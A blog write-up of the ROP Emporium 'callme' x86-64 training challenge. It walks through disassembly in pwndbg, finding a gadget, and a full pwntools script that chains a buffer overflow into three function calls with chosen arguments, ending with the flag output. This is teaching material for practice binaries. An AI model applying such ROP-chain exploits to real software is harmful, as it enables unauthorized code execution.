---
title: "ROP Emporium x86-64 Challenge 3: callme"
date: "2025-12-26"
description: "Writeup for the callme challenge of the x86-64 ROP Emporium challenges."
---

# ROP Emporium Challenge 3: callme 

#### December 26, 2025

This challenge won't be very difficult if we are understood gadgets properly from [the last challenge](rop-emporium-split-writeup).  As the description says, for this challenge we'll need to call three functions in a specific order, with some specific arguments. These three functions are `callme_one`, `callme_two` and `callme_three`. The arguments for those three functions must be `0xdeadbeefdeadbeef`, `0xcafebabecafebabe` and `0xd00df00dd00df00d`.

As we have done in every challenge, let's start by seeing what functions this binary has:

```
pwndbg> info functions
0x00000000004006a8  _init
0x00000000004006d0  puts@plt
0x00000000004006e0  printf@plt
0x00000000004006f0  callme_three@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  callme_one@plt
0x0000000000400730  setvbuf@plt
0x0000000000400740  callme_two@plt
0x0000000000400750  exit@plt
...
0x00000000004008f2  usefulFunction
0x000000000040093c  usefulGadgets
...
```

Let's disassemble `usefulFunction` first:

```
pwndbg> disas usefulFunction
   0x00000000004008f2 <+0>:	push   rbp
   0x00000000004008f3 <+1>:	mov    rbp,rsp
   0x00000000004008f6 <+4>:	mov    edx,0x6
   0x00000000004008fb <+9>:	mov    esi,0x5
   0x0000000000400900 <+14>:	mov    edi,0x4
   0x0000000000400905 <+19>:	call   0x4006f0 <callme_three@plt>
   0x000000000040090a <+24>:	mov    edx,0x6
   0x000000000040090f <+29>:	mov    esi,0x5
   0x0000000000400914 <+34>:	mov    edi,0x4
   0x0000000000400919 <+39>:	call   0x400740 <callme_two@plt>
   0x000000000040091e <+44>:	mov    edx,0x6
   0x0000000000400923 <+49>:	mov    esi,0x5
   0x0000000000400928 <+54>:	mov    edi,0x4
   0x000000000040092d <+59>:	call   0x400720 <callme_one@plt>
   0x0000000000400932 <+64>:	mov    edi,0x1
   0x0000000000400937 <+69>:	call   0x400750 <exit@plt>
```

Looking at the code, even if the function call order is reversed, we can get a very important hint. Judging by the `mov` instructions, we can realize that the `edx`, `esi` and `edi` register are actually the arguments for the functions.

Disassembling `usefulGadgets` hints it as well, and also gives us a gadget we can use to modify the registers ourselves:

```
   0x000000000040093c <+0>:	pop    rdi
   0x000000000040093d <+1>:	pop    rsi
   0x000000000040093e <+2>:	pop    rdx
   0x000000000040093f <+3>:	ret
```

Good! Now we know how the `callme` functions are called, and we also have a gadget that allows us to move arbitrary values to the argument registers. All we need to do now is build the buffer overflow and then jump to the gadget for every function call, pop the argument values into the registers (`0xdeadbeefdeadbeef`, `0xcafebabecafebabe` and `0xd00df00dd00df00d` to `rdi`, `rsi` and `rdx` respectively) and then call the `callme` functions ourselves (we know their addresses from the `info functions` command).

First, let's define some variables with addresses in a Python script with pwntools:

```
from pwn import *

OFFSET = 40
CALLME_ONE_ADDRESS = 0x0000000000400720
CALLME_TWO_ADDRESS = 0x0000000000400740
CALLME_THREE_ADDRESS = 0x00000000004006f0

POP_GADGET_ADDRESS = 0x0040093c

DEADBEEF_ARGUMENT = 0xDEADBEEFDEADBEEF
CAFEBABE_ARGUMENT = 0xCAFEBABECAFEBABE
D00DF00D_ARGUMENT = 0xD00DF00DD00DF00D

RETURN_GADGET = 0x004006be
```

I obtained the offset the same way I did in the other two challenges, with a pattern search using `cyclic`. I go over this slightly in the writeups, and more in depth in my article about [how to perform a simple buffer overflow](/blog/how-to-perform-bof). Feel free to read it if you got lost here.

After that, I just stored the `callme` function addresses we've obtained from `info functions`. Then, I also stored the gadget function address that I got when I disassembled `usefulGadgets`. I also wrote in the arguments we need to call the functions with, and in order to align the stack, I got a return gadget with `rop`. Let's build the payload!

```
from pwn import *

OFFSET = 40
CALLME_ONE_ADDRESS = 0x0000000000400720
CALLME_TWO_ADDRESS = 0x0000000000400740
CALLME_THREE_ADDRESS = 0x00000000004006f0

POP_GADGET_ADDRESS = 0x0040093c # pop rdi ; pop rsi ; pop rdx ; ret

DEADBEEF_ARGUMENT = 0xDEADBEEFDEADBEEF
CAFEBABE_ARGUMENT = 0xCAFEBABECAFEBABE
D00DF00D_ARGUMENT = 0xD00DF00DD00DF00D

RETURN_GADGET = 0x004006be # ret;

payload = b"A" * OFFSET
payload += p64(RETURN_GADGET) # We align the stack

# callme_one
payload += p64(POP_GADGET_ADDRESS)
payload += p64(DEADBEEF_ARGUMENT) # rdi = 0xDEADBEEFDEADBEEF
payload += p64(CAFEBABE_ARGUMENT) # rsi = 0xCAFEBABECAFEBABE
payload += p64(D00DF00D_ARGUMENT) # rdx = 0xD00DF00DD00DF00D
payload += p64(CALLME_ONE_ADDRESS) # We call callme_one with the proper args

# callme_two
payload += p64(POP_GADGET_ADDRESS)
payload += p64(DEADBEEF_ARGUMENT) # rdi = 0xDEADBEEFDEADBEEF
payload += p64(CAFEBABE_ARGUMENT) # rsi = 0xCAFEBABECAFEBABE
payload += p64(D00DF00D_ARGUMENT) # rdx = 0xD00DF00DD00DF00D
payload += p64(CALLME_TWO_ADDRESS) # We call callme_two with the proper args

# callme_three
payload += p64(POP_GADGET_ADDRESS)
payload += p64(DEADBEEF_ARGUMENT) # rdi = 0xDEADBEEFDEADBEEF
payload += p64(CAFEBABE_ARGUMENT) # rsi = 0xCAFEBABECAFEBABE
payload += p64(D00DF00D_ARGUMENT) # rdx = 0xD00DF00DD00DF00D
payload += p64(CALLME_THREE_ADDRESS) # We call callme_three with the proper args

open("exploit", "bw").write(payload)
```

This will create a file called `exploit` that we can use as input for the binary:

```
$ python3 exploit.py
$ ./callme < exploit
callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

Done!

This challenge, even if it didn't present anything I didn't know from the other two challenges, was quite a step up from me, and it made me understand better the use of gadgets in binary exploitation. It's important to get used to working with them. The more exposure to its uses, the better.